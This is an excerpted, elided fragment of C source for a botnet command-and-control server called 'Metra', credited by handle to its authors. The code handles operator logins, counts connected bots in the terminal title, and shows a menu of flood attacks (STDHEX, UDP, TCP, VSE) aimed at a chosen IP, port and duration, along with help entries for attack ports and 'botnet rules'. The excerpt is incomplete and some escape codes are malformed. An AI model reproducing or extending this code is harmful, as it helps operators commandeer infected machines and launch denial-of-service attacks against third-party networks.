...
//Ry Rdm Metra. Server Side                                                                                                                                                                                                                                                                                                                                                                                                                                                Created by RYRDM9#5652 and S4tan's USB
struct login_info {
	char username[100];
	char password[100];
};
...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0; %d Bots | Metra  %c", '\033', BotsConnected(), '\007');
  ...
  sprintf(ascii_banner_line1,  "\x1b[34;0;95m                          ╔╦╗╔═╗╦  ╦╔═╗╦═╗╔═╗╔═╗  ╔╗╔╔═╗╔╦╗\e[0m\r\n");
  sprintf(ascii_banner_line2,  "\x1b[34;0;95m                           ║║║╣ ╚╗╔╝║╣ ╠╦╝╚═╗║╣   ║║║║╣  ║ \e[0m\r\n");
  sprintf(ascii_banner_line3,  "\x1b[34;0;95m                          ═╩╝╚═╝ ╚╝ ╚═╝╩╚═╚═╝╚═╝  ╝╚╝╚═╝ ╩\e[0m\r\n");
  sprintf(ascii_banner_line4,  "\x1b[34;0;95m                                                                 \e[0m\r\n");
  sprintf(ascii_banner_line5,  "\x1b[34;0;95m                 ═══╦═════════════════════════════════════════╦══\e[0m\r\n");
  sprintf(ascii_banner_line6,  "\x1b[34;0;95m              ╔═════╩═════════════════════════════════════════╩═════╗\e[0m\r\n");
  sprintf(ascii_banner_line7,  "\x1b[34;0;95m              ║    STDHEX      ║║    UDP  TCP    ║║    VSE          ║\e[0m\r\n");
  sprintf(ascii_banner_line8,  "\x1b[34;0;95m              ║════════════════║║════════════════║║═════════════════║e[0m\r\n");
  sprintf(ascii_banner_line9,  "\x1b[34;0;95m              ║ !* STDHEX IP    ║║    PORT       ║║     TIME        ║\e[0m\r\n");
  sprintf(ascii_banner_line10,  "\x1b[34;0;95m              ║ !* UDP IP      ║║     PORT       ║║       TIME 0 1024  ║\e[0m\r\n");
  sprintf(ascii_banner_line11,  "\x1b[34;0;95m              ║ !* VSE IP      ║║ PORT TIME      ║║    TIME 1024 10 ║\e[0m\r\n");
  sprintf(ascii_banner_line12,  "\x1b[34;0;95m              ║ !* TCP IP      ║║ PORT TIME      ║║    32 all 1024 0║\e[0m\r\n");
  sprintf(ascii_banner_line13,  "\x1b[34;0;95m              ╚═════════════════════════════════════════════════════╝\e[0m\r\n");
  ...
  if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "Help") || strstr(buf, "?") || strstr(buf, "command") || strstr(buf, "COMMAND")) {
				...
				sprintf(hp8, "\r\n");
				sprintf(hp3, "\e[91m COUNT  \e[1;31mShows Count Of Bots/Users/Dups  \r\n");
				sprintf(hp4, "\e[91m CLEAR  \e[1;31mClears Screen, Back To Banner   \r\n");
				sprintf(hp5, "\e[91m LOGOUT \e[1;31mCloses Out Putty Session        \r\n");
				sprintf(hp6, "\e[91m PORTS  \e[1;31mShows Ports For Use Of Attack   \r\n");
				sprintf(hp7, "\e[91m RULES  \e[1;31mShows Botnet Rules To Follow    \r\n");
				sprintf(hp2, "\e[91m TICKET \e[1;31mOpens Ticket To Support Team    \r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				...
				if(strstr(buf, "method") || strstr(buf, "METHOD") || strstr(buf, "Method")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char ls2  [800];
				char ls3  [800];
				char ls4  [800];
